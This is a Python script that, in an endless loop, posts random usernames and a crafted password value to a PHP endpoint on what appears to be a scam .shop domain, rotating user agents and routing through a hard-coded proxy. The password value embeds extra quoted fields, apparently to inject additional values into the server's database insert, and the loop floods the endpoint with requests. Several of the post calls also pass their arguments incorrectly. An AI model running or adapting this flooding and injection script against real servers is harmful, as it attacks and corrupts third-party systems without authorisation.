#!/usr/bin/env python
#  -*- coding:utf-8 -*-

import requests
import random
import string

import requests
import json

# num = 1  # 这是一个全局变量 为了美观我把他放在第一行
#
#
# def update():  # 示例函数
#     y = 1  # 这是一个局部变量，只有这个函数内可以使用
#     print(num)  # 全局变量在函数内部是可以引用的
#     y = num+1  # 全局变量可以参与运算
#     return y  # 函数结束，y会被销毁，外部无法引用y
count = 0

user_agent_list = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
]

proxy = {
    'http': '123.56.175.31:3128'
}


def test():
    username = random.randint(10000000, 9999999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-"
    sa = []
    for i in range(random.randint(6, 10)):
        sa.append(random.choice(seed))
    salt = ''.join(sa)

    url = 'http://tdhjljgdf.fnnruuan.shop/update/index.php'
    data_json = {'username': username, 'pass': "123345,'1655577813','120.227.94.26','bucz','2022-06-19 02:43:33'"}

    # header = {
    #     "cookie": cookie,
    #     "Accept": "*/*",
    #     "Accept-Encoding": "gzip, deflate, br",
    #     "Accept-Language": "zh-CN,zh;q=0.9",
    #     "Connection": "keep-alive",
    #     "Content-Type": "application/json",
    #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
    # }
    header = {
        'User-Agent': random.choice(user_agent_list)
    }
    r1 = requests.post(url, data_json, headers=header, proxies=proxy)
    r1 = requests.post(url, data_json, header)
    r1 = requests.post(url, data_json, header)
    r1 = requests.post(url, data_json, header)
    r1 = requests.post(url, data_json, header)
    # print("r1返回的内容为-->")
    # print(r1.text)
    return 5

    # print("r2返回的内容为-->" + r2.text)
    # print("r3返回的内容为-->" + r3.text)


if __name__ == '__main__':
    # count = count + test()
    # print("运行了 ", count, "次")
    while True:
        try:
            count = count + test()
            print("运行了 ", count, "次")
        except Exception as e:
            print(e.args)
